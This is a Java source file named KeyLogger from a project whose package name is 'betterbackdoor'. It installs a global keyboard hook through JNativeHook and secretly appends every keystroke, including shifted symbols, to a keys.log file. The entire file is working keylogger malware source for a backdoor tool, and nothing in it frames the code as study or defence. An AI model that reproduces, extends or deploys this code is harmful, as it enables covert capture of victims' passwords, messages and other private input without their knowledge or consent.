package dev.thatcherclough.betterbackdoor.backend;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.io.PrintWriter;

import org.jnativehook.GlobalScreen;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

	private static PrintWriter out;
	private boolean shift = false;

	/**
	 * Starts a key logger and logs keys to {@code dir}\keys.log.
	 *
	 * @param dir directory to log keys to
	 */
	public static void start(String dir) {
		try {
			out = new PrintWriter(new BufferedWriter(new FileWriter(dir + File.separator + "keys.log", true)));
			GlobalScreen.registerNativeHook();
			GlobalScreen.addNativeKeyListener(new KeyLogger());
		} catch (Exception e) {
			if (out != null)
				out.close();
		}
	}

	/*
	 * @see
	 * org.jnativehook.keyboard.NativeKeyListener#nativeKeyPressed(org.jnativehook.
	 * keyboard.NativeKeyEvent)
	 */
	@Override
	public void nativeKeyPressed(NativeKeyEvent key) {
		String pressed = NativeKeyEvent.getKeyText(key.getKeyCode());

		if (pressed.equals("Shift"))
			shift = true;

		if (key.isActionKey())
			out.print("[" + pressed + "]");
		else if (pressed.equals("Backspace"))
			out.print("[Back]");
		else if (pressed.equals("Space"))
			out.print(" ");
		else if (pressed.equals("Tab"))
			out.print("\t");
		else if (pressed.equals("Enter"))
			out.println();
		else if (shift) {
			if (pressed.matches("[A-Z]"))
				out.print(pressed);
			else if (pressed.equals("1"))
				out.print("!");
			else if (pressed.equals("2"))
				out.print("@");
			else if (pressed.equals("3"))
				out.print("#");
			else if (pressed.equals("4"))
				out.print("$");
			else if (pressed.equals("5"))
				out.print("%");
			else if (pressed.equals("6"))
				out.print("^");
			else if (pressed.equals("7"))
				out.print("&");
			else if (pressed.equals("8"))
				out.print("*");
			else if (pressed.equals("9"))
				out.print("(");
			else if (pressed.equals("0"))
				out.print(")");
			else if (pressed.equals("Minus"))
				out.print("_");
			else if (pressed.equals("Equals"))
				out.print("+");
			else if (pressed.equals("Open Bracket"))
				out.print("{");
			else if (pressed.equals("Close Bracket"))
				out.print("}");
			else if (pressed.equals("Back Slash"))
				out.print("|");
			else if (pressed.equals("Semicolon"))
				out.print(":");
			else if (pressed.equals("Quote"))
				out.print("\"");
			else if (pressed.equals("Comma"))
				out.print("<");
			else if (pressed.equals("Period"))
				out.print(">");
			else if (pressed.equals("Dead Acute"))
				out.print("?");
			else if (pressed.equals("Back Quote"))
				out.print("~");
		} else {
			if (pressed.matches("[a-zA-Z0-9]"))
				out.print(pressed.toLowerCase());
			else if (pressed.equals("Minus"))
				out.print("-");
			else if (pressed.equals("Equals"))
				out.print("=");
			else if (pressed.equals("Open Bracket"))
				out.print("[");
			else if (pressed.equals("Close Bracket"))
				out.print("]");
			else if (pressed.equals("Back Slash"))
				out.print("\\");
			else if (pressed.equals("Semicolon"))
				out.print(";");
			else if (pressed.equals("Quote"))
				out.print("'");
			else if (pressed.equals("Comma"))
				out.print(",");
			else if (pressed.equals("Period"))
				out.print(".");
			else if (pressed.equals("Dead Acute"))
				out.print("/");
			else if (pressed.equals("Back Quote"))
				out.print("`");
		}
		out.flush();
	}

	/*
	 * @see
	 * org.jnativehook.keyboard.NativeKeyListener#nativeKeyReleased(org.jnativehook.
	 * keyboard.NativeKeyEvent)
	 */
	@Override
	public void nativeKeyReleased(NativeKeyEvent key) {
		if (NativeKeyEvent.getKeyText(key.getKeyCode()).equals("Shift"))
			shift = false;
	}

	/*
	 * @see
	 * org.jnativehook.keyboard.NativeKeyListener#nativeKeyTyped(org.jnativehook.
	 * keyboard.NativeKeyEvent)
	 */
	@Override
	public void nativeKeyTyped(NativeKeyEvent key) {
	}
}